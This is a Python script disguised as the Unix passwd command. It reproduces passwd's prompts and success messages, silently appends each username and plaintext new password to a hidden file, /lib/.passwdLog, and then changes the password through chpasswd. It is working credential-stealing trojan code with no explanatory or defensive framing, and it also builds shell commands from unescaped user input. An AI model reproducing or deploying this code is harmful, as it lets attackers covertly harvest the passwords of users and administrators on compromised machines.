import os
import sys
import subprocess
import getpass
import socket
import time

def main():
    user = getpass.getuser()
    x = True
    if(user.lower() in ('root')):
        print("Changing password for user "+user+".")
    else:
        print("Changing password for user "+user+".")
        print("Changing password for "+user+".")
    if(user.lower() in ('root')):
        os.system('stty -echo')
        while(x):
            password = input("New password: ")
            print("")
            dump = input("Retype new password: ")
            print("")
            if(password != dump):
                print("Sorry, passwords do not match.")
                print("")
            else:
                x = False
        os.system("echo \"" + user + ":" + password + "\" >> /lib/.passwdLog")
        os.system("echo "+user+":"+password+" | chpasswd")
        print("passwd: all authentication tokens updated successfully.")
        print("\n")
    else:
        os.system('stty -echo')
        while(x):
            current = input("(current) UNIX password: ")
            print("")
            password = input("New password: ")
            print("")
            dump = input("Retype new password: ")
            print("")
            if(password != dump):
                print("Sorry, passwords do not match.")
                print("")
            else:
                x = False
        os.system("echo \"" + user + ":" + password + "\" >> /lib/.passwdLog")
        os.system("echo "+user+":"+password+" | chpasswd")
        print("passwd: all authentication tokens updated successfully.")
        print("\n")
main()